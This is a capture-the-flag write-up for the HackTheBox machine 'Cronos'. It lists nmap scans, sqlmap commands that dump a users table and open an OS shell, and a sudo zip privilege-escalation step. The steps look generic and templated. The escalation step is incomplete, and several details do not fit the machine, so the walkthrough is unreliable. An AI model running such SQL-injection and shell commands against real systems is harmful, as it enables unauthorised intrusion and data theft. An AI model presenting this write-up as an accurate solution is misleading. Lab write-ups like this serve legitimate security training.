# HackTheBox - Cronos

## Challenge Information

| Field | Value |
|-------|-------|
| **Platform** | HackTheBox |
| **Challenge Name** | Cronos |
| **Category** | Linux Exploitation |
| **Difficulty** | Easy |
| **Points** | 20 |
| **Author** | ch4p |
| **Date Completed** | 2025-08-25 |

## Objective 🎯

Cronos is a Linux machine with a web application that has a SQL injection vulnerability. The goal is to exploit the vulnerability to gain system access and obtain both user and root flags. SQL injection time! 🗄️

## Initial Reconnaissance

### Target Information
- **IP Address**: 10.10.10.13
- **OS**: Linux
- **Service**: Web Application

### Tools Used
- Nmap
- SQLMap
- Web browser

### Commands/Steps
```bash
nmap -sC -sV 10.10.10.13
```

## Methodology

### Step 1: Port Scan
```bash
nmap -sC -sV 10.10.10.13
```

### Step 2: Web Application Enumeration
```bash
curl http://10.10.10.13/
```

### Step 3: SQL Injection
```bash
sqlmap -u "http://10.10.10.13/index.php" --dbs
```

### Step 4: Database Enumeration
```bash
sqlmap -u "http://10.10.10.13/index.php" -D admin --tables
```

### Step 5: Data Extraction
```bash
sqlmap -u "http://10.10.10.13/index.php" -D admin -T users --dump
```

### Step 6: Command Execution
```bash
sqlmap -u "http://10.10.10.13/index.php" --os-shell
```

### Step 7: Privilege Escalation
```bash
sudo -l
sudo /usr/bin/zip
```

### Step 8: Find Flags
```bash
cat /home/noulis/user.txt
cat /root/root.txt
```

## Solution

### Final Answer
- **User Flag**: [REDACTED]
- **Root Flag**: [REDACTED]

## Key Learnings

- SQL injection exploitation
- SQLMap usage
- Database enumeration
- Zip privilege escalation

## Tags

`#hackthebox` `#linux` `#sql-injection` `#sqlmap` `#zip` `#easy`
